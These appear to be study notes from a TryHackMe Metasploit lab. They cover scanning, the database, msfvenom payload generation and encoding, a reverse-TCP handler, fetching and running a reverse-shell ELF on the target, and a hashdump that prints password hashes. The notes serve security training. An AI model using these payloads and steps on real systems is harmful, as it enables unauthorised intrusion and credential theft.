# Metasploit: Exploitation
---

## Scanning

```sh
msf6 > search portscan

Matching Modules
================

   #  Name                                              Disclosure Date  Rank    Check  Description
   -  ----                                              ---------------  ----    -----  -----------
   0  auxiliary/scanner/portscan/ftpbounce              .                normal  No     FTP Bounce Port Scanner
   1  auxiliary/scanner/natpmp/natpmp_portscan          .                normal  No     NAT-PMP External Port Scanner
   2  auxiliary/scanner/sap/sap_router_portscanner      .                normal  No     SAPRouter Port Scanner
   3  auxiliary/scanner/portscan/xmas                   .                normal  No     TCP "XMas" Port Scanner
   4  auxiliary/scanner/portscan/ack                    .                normal  No     TCP ACK Firewall Scanner
   5  auxiliary/scanner/portscan/tcp                    .                normal  No     TCP Port Scanner
   6  auxiliary/scanner/portscan/syn                    .                normal  No     TCP SYN Port Scanner
   7  auxiliary/scanner/http/wordpress_pingback_access  .                normal  No     Wordpress Pingback Locator


Interact with a module by name or index. For example info 7, use 7 or use auxiliary/scanner/http/wordpress_pingback_access


msf6 > search portscan

Matching Modules
================

   #  Name                                              Disclosure Date  Rank    Check  Description
   -  ----                                              ---------------  ----    -----  -----------
   0  auxiliary/scanner/portscan/ftpbounce              .                normal  No     FTP Bounce Port Scanner
   1  auxiliary/scanner/natpmp/natpmp_portscan          .                normal  No     NAT-PMP External Port Scanner
   2  auxiliary/scanner/sap/sap_router_portscanner      .                normal  No     SAPRouter Port Scanner
   3  auxiliary/scanner/portscan/xmas                   .                normal  No     TCP "XMas" Port Scanner
   4  auxiliary/scanner/portscan/ack                    .                normal  No     TCP ACK Firewall Scanner
   5  auxiliary/scanner/portscan/tcp                    .                normal  No     TCP Port Scanner
   6  auxiliary/scanner/portscan/syn                    .                normal  No     TCP SYN Port Scanner
   7  auxiliary/scanner/http/wordpress_pingback_access  .                normal  No     Wordpress Pingback Locator


Interact with a module by name or index. For example info 7, use 7 or use auxiliary/scanner/http/wordpress_pingback_access

```
- **CONCURRENCY:** Number of targets to be scanned simultaneously.
- **PORTS:** Port range to be scanned. Please note that `1-1000` here will not be the same as using Nmap with the default configuration. Nmap will scan the 1000 most used ports, while Metasploit will scan port numbers from `1` to `10000`.
- **RHOSTS:** Target or target network to be scanned.
- **THREADS:** Number of threads that will be used simultaneously. More threads will result in faster scans.

- **The `scanner/discovery/udp_sweep` module will allow you to quickly identify services running over the UDP (User Datagram Protocol). As you can see below, this module will not conduct an extensive scan of all possible UDP services but does provide a quick way to identify services such as DNS or NetBIOS.**

## Metasploit database
```sh
$ systemctl start postgresql
$ sudo msfdb init 

msf6 > db_status
[*] Connected to msf. Connection type: postgresql.
           
msf6 > workspace
* default
msf6 >



msf6 > workspace -a tryhackme
[*] Added workspace: tryhackme
[*] Workspace: tryhackme
msf5 > workspace
default
* tryhackme
msf6 >

```

### DB backend Commands
```sh
Database Backend Commands
=========================

Command           Description
-------           -----------
analyze           Analyze database information about a specific address or address range
db_connect        Connect to an existing data service
db_disconnect     Disconnect from the current data service
db_export         Export a file containing the contents of the database
db_import         Import a scan result file (filetype will be auto-detected)
db_nmap           Executes nmap and records the output automatically
db_rebuild_cache  Rebuilds the database-stored module cache (deprecated)
db_remove         Remove the saved data service entry
db_save           Save the current data service connection as the default to reconnect on startup
db_status         Show the current data service status
hosts             List all hosts in the database
loot              List all loot in the database
notes             List all notes in the database
services          List all services in the database
vulns             List all vulnerabilities in the database
workspace         Switch between database workspaces
```
```sh
msf6 > db_nmap -sV  10.10.60.116

msf6 > hosts

Hosts
=====

address       mac  name  os_name  os_flavor  os_sp  purpose  info  comments
-------       ---  ----  -------  ---------  -----  -------  ----  --------
10.10.60.116             Unknown                    device

msf6 > services
Services
========

host          port  proto  name         state  info
----          ----  -----  ----         -----  ----
10.10.60.116  21    tcp    ftp          open   ProFTPD 1.3.5e
10.10.60.116  22    tcp    ssh          open   OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 Ubuntu Linux; protocol 2.0
10.10.60.116  139   tcp    netbios-ssn  open   Samba smbd 3.X - 4.X workgroup: ACME IT SUPPORT
10.10.60.116  445   tcp    netbios-ssn  open   Samba smbd 3.X - 4.X workgroup: ACME IT SUPPORT
10.10.60.116  8000  tcp    http         open   WebFS httpd 1.21

```

## msfvenom
- **`msfvenom -l payloads ` this will list the payloads you have**
- **`msfvenom --list formats` this will list the supported output format**

### Encoders

- **Contrary to some beliefs, encoders do not aim to bypass antivirus installed on the target system. As the name suggests, they encode the payload. While it can be effective against some antivirus software, using modern obfuscation techniques or learning methods to inject shellcode is a better solution to the problem. The example below shows the usage of encoding (with the `-e` parameter. The PHP version of Meterpreter was encoded in Base64, and the output format was `raw`.)**

- **`msfvenom -p php/meterpreter/reverse_tcp LHOST=10.17.88.30 -f raw -e php/base64`** 
- **In the the payload we add `-f raw` to have the raw generated php code and we add `-e php/base64` to obfuscate the php code to base64**

### Handler
- **We use handler to listen to the connection**
- **For reversed tcp we need to listen the connection because it will callback form the target machine**
   - **We use `use exploit/multi/handler` in the msfconsole we add our payload by generating the payload from msfvenom or we can add the payload form metasploit both are same**

#### Gaining Access through handler
**Attacking Machine**
```sh
$ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.17.88.30 LPORT=1234 -f elf > rev_shell.elf
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 123 bytes
Final size of elf file: 207 bytes

$ python3 -m http.server 80

```
```sh
msf6 > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > ls
[*] exec: ls

rev_shell.elf  task.txt
msf6 exploit(multi/handler) > show options
msf6 exploit(multi/handler) > set payload rev_shell.elf
[-] The value specified for payload is not valid.
msf6 exploit(multi/handler) > set payload php/reverse_p
[-] The value specified for payload is not valid.
msf6 exploit(multi/handler) > set payload php/reverse_php 
payload => php/reverse_php
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.17.88.30:1234 
^C[-] Exploit failed [user-interrupt]: Interrupt 
[-] run: Interrupted
msf6 exploit(multi/handler) > set payload lverse_tcpmeterpreter/re 
payload => linux/x86/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set payload lverse_tcpmeterpreter/re 
payload => linux/x86/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.17.88.30:1234 
[*] Sending stage (1017704 bytes) to 10.10.198.128
```

**Target Machine**

```sh
root@ip-10-10-198-128:/# wget http://10.17.88.30:80/rev_shell.elf
--2024-08-15 21:02:57--  http://10.17.88.30/rev_shell.elf
Connecting to 10.17.88.30:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 207 [application/octet-stream]
Saving to: ‘rev_shell.elf’

rev_shell.e   0%       0  --.-KB/s         rev_shell.e 100%     207  --.-KB/s    in 0s      

2024-08-15 21:02:57 (15.5 MB/s) - ‘rev_shell.elf’ saved [207/207]

root@ip-10-10-198-128:/# ls
bin             lost+found     snap
boot            media          srv
dev             mnt            sys
etc             opt            tmp
home            proc           usr
initrd.img      rev_shell.elf  var
initrd.img.old  root           vmlinuz
lib             run            vmlinuz.old
lib64           sbin
root@ip-10-10-198-128:/# chmod +x rev_shell.elf 
root@ip-10-10-198-128:/# ./rev_shell.elf 
root@ip-10-10-198-128:/# ./rev_shell.elf 

```
**Post Exploitation**
```sh
meterpreter > run post/linux/gather/hashdump

[+] murphy:$6$qK0Kt4UO$HuCrlOJGbBJb5Av9SL7rEzbxcz/KZYFkMwUqAE0ZMDpNRmOHhPHeI2JU3m9OBOS7lUKkKMADLxCBcywzIxl7b.:1001:1001::/home/murphy:/bin/sh
[+] claire:$6$Sy0NNIXw$SJ27WltHI89hwM5UxqVGiXidj94QFRm2Ynp9p9kxgVbjrmtMez9EqXoDWtcQd8rf0tjc77hBFbWxjGmQCTbep0:1002:1002::/home/claire:/bin/sh
[+] Unshadowed Password File: /home/bc-here/.msf4/loot/20240815171349_default_10.10.198.128_linux.hashes_111171.txt

```